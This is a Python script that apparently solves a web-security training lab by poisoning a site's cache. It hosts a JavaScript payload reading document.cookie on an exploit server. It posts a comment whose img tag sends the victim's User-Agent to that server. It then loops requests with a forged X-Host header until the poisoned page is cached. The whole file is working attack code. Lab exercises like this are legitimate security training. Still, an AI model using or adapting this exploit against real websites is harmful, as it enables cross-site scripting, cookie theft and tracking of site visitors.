import requests
from requests_toolbelt.adapters.host_header_ssl import HostHeaderSSLAdapter
import sys
import urllib3
import time
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def send_vuln_payload(s, exploit_url, exploit_path, responseFile, responseBody, formAction): 
    target_url = exploit_url + exploit_path
    data = {
        'urlIsHttps': 'on',
        'responseFile': responseFile,
        'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
        'responseBody': responseBody,
        'formAction': formAction
    }
    r = s.post(target_url, data=data, allow_redirects=True)

    if r.status_code == 200:
        print('[+] Sent vuln request to victim')
    else:
        print('[-] Fail to send vuln request')
        sys.exit(-1)

def post_comment(s, url, path, csrf_path, postId, comment, name, email, website):
    target_url = url + path
    payload = {
        'csrf': get_csrf_token(s, url, csrf_path),
        'postId': postId,
        'comment': comment,
        'name': name,
        'email': email,
        'website': website
    }
    r = s.post(target_url, data=payload, allow_redirects=False)

    if r.status_code == 302:
        print('[+] Success post a comment')
    else:
        print('[-] Failed to post a comment')
        sys.exit(-1)

def goto(s, url, path, headers=headers, cookies={}):
    target_url = url + path
    r = s.get(target_url, headers=headers, cookies=cookies)
    return r.text

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <exploit_url>" % sys.argv[0])
        print("(+) Example: %s www.example.com www.abc.exploit-server.net" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 
    exploit_url = sys.argv[2][:-1] if sys.argv[2][-1] == '/' else sys.argv[2]

    filePath = '/resources/js/tracking.js'
    payload = 'alert(document.cookie)'
    postId = 1
    comment = f'<img src="{exploit_url}/log">'
    name = 'test'
    email = 'test@gmail.com'
    website = 'https://test.com'
    
    send_vuln_payload(s, exploit_url, '/', filePath, payload, 'STORE')
    post_comment(s, url, '/post/comment', f'/post?postId={postId}', postId, comment, name, email, website)
    print(f'Find User-Agent appear in {exploit_url+'/log'}')
    user_agent = input('Type victim User-Agent: ')
    custom_headers = {
        'X-Host': exploit_url.split('//')[1],
        'User-Agent': user_agent
    }
    while True:
        goto(s, url, '/', custom_headers)
        check_solved_lab(s, url)
        time.sleep(5)

if __name__ == '__main__':
    main()